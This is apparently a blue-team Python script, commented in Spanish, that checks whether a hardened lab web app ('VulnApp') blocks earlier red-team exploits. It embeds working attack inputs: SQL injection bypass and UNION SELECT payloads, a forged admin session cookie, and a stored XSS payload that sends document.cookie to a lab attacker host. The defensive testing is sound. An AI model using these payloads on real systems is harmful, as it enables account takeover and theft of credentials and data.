#!/usr/bin/env python3
"""
=============================================================================
VulnApp Blue Team — Verificación de Contramedidas
=============================================================================
Script de validación que demuestra que los exploits del Red Team YA NO
funcionan en la versión asegurada (feature/injection + feature/crypto-failures).

Ejecutar contra el servidor SEGURO (puerto 4000 de la versión asegurada):
  python3 06_verificacion_contramedidas.py

Demuestra:
  ✅ SQLi en /api/login → rechazado (sentencias preparadas)
  ✅ SQLi UNION en /api/search → sin datos sensibles (parámetros SQL)
  ✅ Cookie Base64 adulterada → HTTP 401 (HMAC inválido)
  ✅ XSS Worm → se muestra como texto literal (textContent)
=============================================================================
"""

import urllib.request
import urllib.error
import json
import base64
import time

TARGET = "http://192.168.56.20:4000"

BANNER = """
╔══════════════════════════════════════════════════════════════╗
║   VulnApp Blue Team — VALIDACIÓN DE CIERRE                  ║
║   Demostración de ineficacia de los exploits del Red Team    ║
╚══════════════════════════════════════════════════════════════╝
"""

PASS = "✅ CONTRAMEDIDA ACTIVA"
FAIL = "❌ VULNERABILIDAD PERSISTENTE"


def http_post(path, body, cookie=None):
    url = TARGET + path
    headers = {"Content-Type": "application/json"}
    if cookie:
        headers["Cookie"] = f"session={cookie}"
    req = urllib.request.Request(url, data=json.dumps(body).encode(),
                                  headers=headers, method="POST")
    try:
        with urllib.request.urlopen(req, timeout=8) as resp:
            return resp.status, json.loads(resp.read().decode())
    except urllib.error.HTTPError as e:
        try:    return e.code, json.loads(e.read().decode())
        except: return e.code, {}
    except Exception as ex:
        return 0, {"error": str(ex)}


def http_get(path, cookie=None):
    url = TARGET + path
    headers = {}
    if cookie:
        headers["Cookie"] = f"session={cookie}"
    req = urllib.request.Request(url, headers=headers, method="GET")
    try:
        with urllib.request.urlopen(req, timeout=8) as resp:
            return resp.status, json.loads(resp.read().decode())
    except urllib.error.HTTPError as e:
        try:    return e.code, json.loads(e.read().decode())
        except: return e.code, {}
    except Exception as ex:
        return 0, {"error": str(ex)}


def obtener_cookie_legítima():
    url = f"{TARGET}/api/login"
    data = json.dumps({"username": "alice", "password": "password1"}).encode()
    req = urllib.request.Request(url, data=data,
                                  headers={"Content-Type": "application/json"}, method="POST")
    try:
        with urllib.request.urlopen(req, timeout=8) as resp:
            sc = resp.getheader("Set-Cookie", "")
            if "session=" in sc:
                return sc.split("session=")[1].split(";")[0]
    except Exception:
        pass
    return None


def check(condicion, descripcion, detalle=""):
    estado = PASS if condicion else FAIL
    print(f"\n  {estado}")
    print(f"  Test  : {descripcion}")
    if detalle:
        print(f"  Dato  : {detalle}")


def main():
    print(BANNER)
    print(f"[*] Target: {TARGET}")
    print(f"[*] Ejecutando validación de cierre...\n")
    resultados = []

    # ────────────────────────────────────────────────────────────────────────
    print("═" * 60)
    print(" TEST 1: SQL Injection en /api/login (CWE-89)")
    print("═" * 60)
    sqli_payload = {"username": "' OR '1'='1'--", "password": "cualquiera"}
    status, resp = http_post("/api/login", sqli_payload)
    ok = status == 401
    check(ok, "SQLi bypass con ' OR '1'='1'--",
          f"HTTP {status} → {resp}")
    print(f"  Razón : Sentencia preparada → el payload es tratado como dato literal")
    resultados.append(ok)

    # ────────────────────────────────────────────────────────────────────────
    print("\n" + "═" * 60)
    print(" TEST 2: SQLi UNION en /api/login (exfiltración de BD)")
    print("═" * 60)
    union_payload = {"username": "' UNION SELECT id,username,password,role,email FROM users--",
                     "password": "x"}
    status, resp = http_post("/api/login", union_payload)
    ok = status == 401 and "users" not in str(resp)
    check(ok, "UNION SELECT de tabla users en /api/login",
          f"HTTP {status} → {str(resp)[:200]}")
    resultados.append(ok)

    # ────────────────────────────────────────────────────────────────────────
    print("\n" + "═" * 60)
    print(" TEST 3: SQLi UNION en /api/search (CWE-89)")
    print("═" * 60)
    cookie = obtener_cookie_legítima()
    if cookie:
        search_payload = {"query": "' UNION SELECT username,password,email FROM users--"}
        status, resp = http_post("/api/search", search_payload, cookie=cookie)
        # En versión segura no debe aparecer ningún hash de contraseña
        hashes_expuestos = any(
            len(str(v)) == 32 for row in resp.get("results", []) for v in row.values()
        )
        ok = not hashes_expuestos
        check(ok, "UNION SELECT en /api/search no expone hashes",
              f"HTTP {status} → resultados: {len(resp.get('results',[]))} filas (sin hashes)")
        print(f"  Razón : Sentencia preparada con LIKE ? — UNION SELECT retorna 0 filas o error")
        resultados.append(ok)
    else:
        print("  [!] No se pudo obtener cookie para test de búsqueda")
        resultados.append(False)

    # ────────────────────────────────────────────────────────────────────────
    print("\n" + "═" * 60)
    print(" TEST 4: Cookie Base64 adulterada (CWE-345)")
    print("═" * 60)
    fake_cookie = base64.b64encode(
        b'{"userId":2,"username":"alice","role":"admin"}'
    ).decode()
    status, resp = http_get("/api/profile", cookie=fake_cookie)
    ok = status in (401, 403)
    check(ok, "Cookie Base64 con role=admin rechazada",
          f"HTTP {status} → {resp}")
    print(f"  Razón : HMAC-SHA256 — re-generado con clave secreta → no coincide → 401/403")
    resultados.append(ok)

    # ────────────────────────────────────────────────────────────────────────
    print("\n" + "═" * 60)
    print(" TEST 5: Stored XSS — inyección de <script> en mensaje (CWE-79)")
    print("═" * 60)
    if cookie:
        xss_payload = "<script>fetch('http://192.168.56.10:8888/?c='+document.cookie)</script>"
        status, resp = http_post("/api/message",
                                  {"receiverId": 1, "content": xss_payload}, cookie=cookie)
        msg_ok = status == 200  # El mensaje se acepta (no podemos bloquear HTML en el servidor sin filtrar)

        # Verificar cómo viene en la respuesta de mensajes
        status2, resp2 = http_get("/api/messages", cookie=cookie)
        escaped = False
        for m in resp2.get("messages", []):
            c = m.get("content", "")
            if "&lt;script&gt;" in c or "<script>" not in c:
                escaped = True

        check(escaped, "XSS Worm almacenado se devuelve escapado del servidor",
              f"Contenido: {resp2.get('messages',[{}])[0].get('content','—')[:100]}")
        print(f"  Razón : escapeHtml() en servidor + textContent en frontend — no ejecuta")
        resultados.append(escaped)
    else:
        print("  [!] Sin cookie — omitido")
        resultados.append(False)

    # ────────────────────────────────────────────────────────────────────────
    print("\n" + "═" * 60)
    print(" TEST 6: Contraseña almacenada como scrypt (NO MD5) (CWE-327/759/916)")
    print("═" * 60)
    # Login correcto con la versión segura y verificar que se puede autenticar
    status, resp = http_post("/api/login", {"username": "alice", "password": "password1"})
    ok = status == 200
    check(ok, "Login correcto funciona con contraseña en scrypt",
          f"HTTP {status} → {resp}")
    print(f"  Razón : verifyPassword() usa crypto.scryptSync + timingSafeEqual")
    print(f"  Nota  : MD5 descifrado en <0.001s. scrypt imposible de crackear offline.")
    resultados.append(ok)

    # ────────────────────────────────────────────────────────────────────────
    print("\n" + "═" * 60)
    print(" RESUMEN FINAL")
    print("═" * 60)
    pasados   = sum(1 for r in resultados if r)
    fallidos  = len(resultados) - pasados
    porcentaje = (pasados / len(resultados)) * 100

    print(f"\n  Tests pasados : {pasados}/{len(resultados)} ({porcentaje:.0f}%)")
    print(f"  Tests fallidos: {fallidos}")
    print()
    if fallidos == 0:
        print("  ✅ VALIDACIÓN DE CIERRE: TODOS LOS EXPLOITS NEUTRALIZADOS")
        print("     La versión asegurada resiste el 100% de los vectores del Red Team.")
    else:
        print(f"  ⚠  {fallidos} vectore(s) aún pueden ser efectivos.")
        print("     Revisar las contramedidas correspondientes.")
    print()


if __name__ == "__main__":
    main()
